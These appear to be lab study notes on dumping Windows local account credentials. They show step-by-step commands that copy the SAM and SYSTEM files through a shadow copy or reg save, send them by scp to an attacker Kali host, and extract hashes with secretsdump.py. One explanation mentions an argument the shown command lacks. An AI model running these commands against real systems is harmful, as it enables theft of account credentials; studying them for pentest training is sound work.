Local Windows Credentials:

In general, Windows operating system provides two types of user accounts: Local and Domain. 
Local users' details are stored locally within the Windows file system, while domain users' details are stored in the centralized Active Directory

Security Account Manager (SAM):
The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. 
The SAM database stores these details in an encrypted format to make them harder to be retrieved.

There are various ways and attacks to dump the content of the SAM database:
    C:\Windows\system32>type c:\Windows\System32\config\sam
        -> should return:
            "The process cannot access the file because it is being used by another process."

In this case, we can use:
Volume Shadow Copy Service:
    The other approach uses the Microsoft Volume shadow copy service, which helps perform a volume backup while applications read/write on volumes.

    we will be using wmic to create a shadow volume copy. This has to be done through the command prompt with administrator privileges as follows,

    Run the standard cmd.exe prompt with administrator privileges.
    Execute the wmic command to create a copy shadow of C: drive
    Verify the creation from step 2 is available.
    Copy the SAM database from the volume we created in step 2

Creating a Shadow Copy of Volume C with WMIC - Admin Priv
    C:\Users\Administrator>wmic shadowcopy call create Volume='C:\'

Use the vssadmin, Volume Shadow Copy Service administrative command-line tool, to list and confirm that we have a shadow copy of the C: volume:
    vssadmin list shadows
    *The output shows that we have successfully created a shadow copy volume of (C:) with the following path: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1.

As mentioned previously, the SAM database is encrypted either with RC4 or AES encryption algorithms. 
In order to decrypt it, we need a decryption key which is also stored in the files system in c:\Windows\System32\Config\system. 

Now let's copy both files (sam and system) from the shadow copy volume we generated to the desktop as follows:
    SAM -> C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\<Administrator> or <Low Privilege User>\Desktop\sam
        1 file(s) copied.

    SYSTEME -> C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\<Administrator> or <Low Privilege User>\Desktop\system
        1 file(s) copied.


SCP - Now we have both required files, transfer them to the AttackBox with your favourite method . 
    ->C:\Users\Username\Desktop>scp sam <Username>@<KALI IP>:/FilePAth/ .
    ->C:\Users\Username\Desktopscp system <Username>@<KALI IP>:/FilePAth/ .

Let's this time decrypt it using one of the Impacket tools: secretsdump.py:
    Move both SAM and system files to the AttackBox and run the following command:
    Kali>python3.9 /opt/impacket/examples/secretsdump.py -sam sam -system system

    *Note that we used the SAM and System files that we extracted from Windows Registry. The -sam argument is to specify the path for the dumped sam file from the Windows machine. 
    The -system argument is for a path for the system file. 
    We used the LOCAL argument at the end of the command to decrypt the Local SAM file as this tool handles other types of decryption. 

    ######  BONUS  #######
Registry Hives:
Another possible method for dumping the SAM database content is through the Windows Registry. 
Windows registry also stores a copy of some of the SAM database contents to be used by Windows services. 
Luckily, we can save the value of the Windows registry using the reg.exe tool. 

As previously mentioned, we need two files to decrypt the SAM database's content. Ensure you run the command prompt with Administrator privileges.

Save SAM and SYSTEM files from the registry
    C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
    The operation completed successfully.

    C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
    The operation completed successfully.

    C:\Users\Administrator\Desktop>


